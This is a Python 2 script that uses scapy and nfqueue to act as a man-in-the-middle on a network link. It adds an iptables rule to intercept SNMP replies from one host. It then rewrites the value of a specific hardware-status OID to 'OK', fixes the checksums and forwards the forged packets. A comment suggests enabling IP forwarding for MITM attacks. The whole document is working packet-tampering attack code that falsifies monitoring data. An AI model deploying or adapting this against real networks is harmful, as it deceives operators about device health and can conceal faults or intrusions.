#!/usr/bin/python2

"""
    This code modifies packets in a physical MITM with scapy.
    This changes the value of a specific SNMP OID sent as an answer from src IP 10.1.1.99
"""

import nfqueue
from scapy.all import *
import os

iptablesr = "iptables -A FORWARD -m physdev --physdev-in eth1 -s 10.1.1.99 -p udp -j NFQUEUE"

print("Adding iptable rules :")
print(iptablesr)
os.system(iptablesr)

# If you want to use it for MITM attacks, set ip_forward=1 :
#print("Set ipv4 forward settings : ")
#os.system("sysctl net.ipv4.ip_forward=1")

def callback(payload):
    # Here is where the magic happens.
    data = payload.get_data()
    pkt = IP(data)
    print "Got a packet ! source ip : %s dest: %s" % (str(pkt.src), str(pkt.dst))
    #pkt.show()
    if pkt["UDP"].sport == 161 and ".1.3.6.1.4.1.232.6.2.9.3.1.4" in str(pkt["SNMPvarbind"].oid.strshow()):
        # Mod all packets with that specific OID
        print "Modding..."
        #pkt.show()
        # print str(pkt["SNMPvarbind"].oid)
        new = 0
        print "Old status: %i (%r)" % (pkt["SNMPvarbind"].value.val,pkt["SNMPvarbind"].oid )
        if ".1.3.6.1.4.1.232.6.2.9.3.1.4.1" in str(pkt["SNMPvarbind"].oid.strshow()):
         new = 2
         print "New status: %i (OK)" % new

        pkt["SNMPvarbind"].value = ASN1_INTEGER(new)
        #del needed for correct checksum recalculation
        del pkt[UDP].len
        del pkt[IP].len
        del pkt[UDP].chksum
        del pkt[IP].chksum

        #pkt["UDP"].len = len(pkt["SNMP"])
        #pkt["IP"].len = len(pkt["UDP"])
        #pkt.show()
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

    else:
        # Let the rest go it's way unmodified
        payload.set_verdict(nfqueue.NF_ACCEPT)

def main():
    # This is the intercept
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        print "[+] Running Main loop"
        q.try_run() # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        print("Flushing iptables.")
        # Remove the forwarded rule
        os.system('iptables -D FORWARD -m physdev --physdev-in eth1 -s 10.1.1.99 -p udp -j NFQUEUE')
        #os.system('iptables -X')


if __name__ == "__main__":
  main()
